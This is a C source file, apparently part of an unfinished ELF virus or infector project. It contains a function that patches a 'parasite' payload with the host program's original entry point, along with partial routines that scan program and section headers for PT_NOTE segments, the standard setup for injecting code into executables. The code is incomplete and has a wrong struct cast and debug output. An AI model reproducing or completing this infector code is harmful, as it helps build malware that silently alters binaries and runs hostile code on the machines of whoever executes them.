#include "wwp.h"

// Finds the placeholder (for address where our parasite code will jump after executing its body) and
// writes the host's entry point (original entry point address) to it.
void		AddrPatcher(u_int8_t *parasite, long placeholder, long address)
{
	u_int8_t *ptr = parasite;
	int i;
	for (i = 0 ; i < parasite_size ; ++i)
	{
		long potential_placeholder = *((long *)(ptr + i));

		if (!(placeholder ^ potential_placeholder))
		{
			*((long *)(ptr + i)) = address;
			return;
		}
	}
}

void		ModifyNOTEphdr(void *ptr)
{
	Elf64_Ehdr	*ehdr		= (Elf64_Ehdr *) ptr;
	u_int16_t	phnum 		= ehdr->e_phnum;
	Elf64_Off	pht_offset 	= ehdr->e_phoff;
	Elf64_Phdr *phdr = (Elf64_Phdr *)(ptr + pht_offset);

	int i;
	for (i = 0 ; i < phnum ; ++i)
	{
		dprintf(2, "yaaAAaa\n");
		if (phdr[i].p_type == PT_NOTE)
			dprintf(2, "NOTE FOUND (%d)\n", i);
	}
}

void		ModifyNOTEshdr(void *ptr)
{
	Elf64_Ehdr	*ehdr		= (Elf64_Ehdr *) ptr;
	u_int16_t	shnum 		= ehdr->e_shnum;
	Elf64_Off	sht_offset 	= ehdr->e_shoff;
	Elf64_Half	shstrndx	= ehdr->e_shstrndx;
	Elf64_Phdr *shdr = (Elf64_Phdr *)(ptr + sht_offset);

	dprintf(2, "string ? => [%s]\n", ptr + shstrndx);
	dprintf(2, "idx = %x\n", shstrndx);
	for (int i = 0; i < shnum; ++i)
	{
		

	}
}
